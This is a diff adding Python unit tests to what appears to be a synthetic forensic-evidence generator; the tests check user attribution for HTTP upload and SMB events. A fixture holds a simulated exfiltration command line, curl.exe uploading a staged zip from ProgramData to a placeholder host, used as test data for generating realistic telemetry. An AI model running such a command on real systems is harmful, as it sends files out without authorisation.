@@ -39,6 +39,7 @@ from evidenceforge.models.scenario import (
     BeaconEventSpec,
     ConnectionEventSpec,
     DhcpLeaseEventSpec,
+    SmbActivityEventSpec,
     System,
     User,
 )
@@ -77,6 +78,110 @@ def _activity_generator_with_captured_builders(
 
 
 class TestStorylineCommandNetworks:
+    def test_http_upload_local_read_uses_process_local_principal(self):
+        """NewCredentials must not replace the local token for an upload file read."""
+        local_actor = "aisha.johnson"
+        remote_actor = User(
+            username="marcus.chen",
+            full_name="Marcus Chen",
+            email="marcus.chen@example.com",
+        )
+        system = System(
+            hostname="WS-AJOHNSON-01",
+            ip="10.10.1.35",
+            os="Windows 11",
+            type="workstation",
+        )
+        process_start = datetime(2026, 5, 11, 12, 0, tzinfo=UTC)
+        state = _FakeStateManager()
+        state.processes[(system.hostname, 6912)] = SimpleNamespace(
+            pid=6912,
+            parent_pid=6800,
+            image=r"C:\Windows\System32\curl.exe",
+            command_line=(
+                r"curl.exe -F file=@C:\ProgramData\Microsoft\cache_7f3a.zip "
+                "https://example.test/upload"
+            ),
+            username=local_actor,
+            logon_id="0x900",
+            start_time=process_start,
+        )
+        captured: list[Any] = []
+        engine = object.__new__(StorylineMixin)
+        engine.state_manager = state
+        engine.activity_generator = _FakeActivityGenerator()
+        engine.dispatcher = SimpleNamespace(dispatch_builder=captured.append)
+
+        engine._emit_http_upload_file_read(
+            actor=remote_actor,
+            system=system,
+            pid=6912,
+            process_image=r"C:\Windows\System32\curl.exe",
+            command_line=state.processes[(system.hostname, 6912)].command_line,
+            entity=SimpleNamespace(local_source_path=r"C:\ProgramData\Microsoft\cache_7f3a.zip"),
+            connection_time=process_start + timedelta(seconds=2),
+        )
+
+        assert captured[0].auth.username == local_actor
+        assert captured[0].process.username == local_actor
+
+    def test_storyline_smb_activity_lets_bundle_choose_capable_process(self):
+        """Type 9 SMB keeps the local actor distinct and rejects a stale prior process."""
+        local_actor = User(username="alice", full_name="Alice", email="alice@example.com")
+        actor = User(username="admin", full_name="Admin", email="admin@example.com")
+        system = System(
+            hostname="WS-ALICE-01",
+            ip="10.10.1.20",
+            os="Windows 11",
+            type="workstation",
+        )
+        captured: list[dict[str, Any]] = []
+
+        def generate_smb_activity(**kwargs: Any) -> SimpleNamespace:
+            captured.append(kwargs)
+            return SimpleNamespace(
+                session_id="smb-session",
+                tree_ids=("tree-1",),
+                transport_uids=("Csmb",),
+                operations=(),
+            )
+
+        engine = object.__new__(StorylineMixin)
+        engine.dispatcher = SimpleNamespace(storyline_cluster_id=None)
+        engine.state_manager = _FakeStateManager()
+        engine.state_manager.sessions["0x900"] = SimpleNamespace(
+            username=local_actor.username,
+            system=system.hostname,
+            logon_id="0x900",
+            logon_type=9,
+            source_ip="-",
+            start_time=datetime(2026, 5, 11, 11, 59, tzinfo=UTC),
+            network_close_time=None,
+        )
+        engine.scenario = SimpleNamespace(environment=SimpleNamespace(users=[local_actor, actor]))
+        engine._storyline_logon_registry = {(actor.username, system.hostname): ["0x900"]}
+        engine.activity_generator = SimpleNamespace(generate_smb_activity=generate_smb_activity)
+        engine._last_storyline_process_by_system = {
+            system.hostname: (6868, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe")
+        }
+
+        engine._execute_typed_event(
+            spec=SmbActivityEventSpec(
+                operation="read",
+                target={"type": "share", "share": "FILE-SRV-01.finance"},
+            ),
+            actor=actor,
+            system=system,
+            time=datetime(2026, 5, 11, 12, 0, tzinfo=UTC),
+            activity="Copy files",
+            explicit_types={"smb_activity"},
+        )
+
+        assert "process_pid" not in captured[0]
+        assert "process_image" not in captured[0]
+        assert captured[0]["actor"] == local_actor
+        assert captured[0]["spec"].smb_principal == actor.username
+
     def test_storyline_shell_friction_renderer_rejects_unsafe_formatting(self):
         """Overlay-controlled shell-friction templates should not use Python format specs."""
         values = {
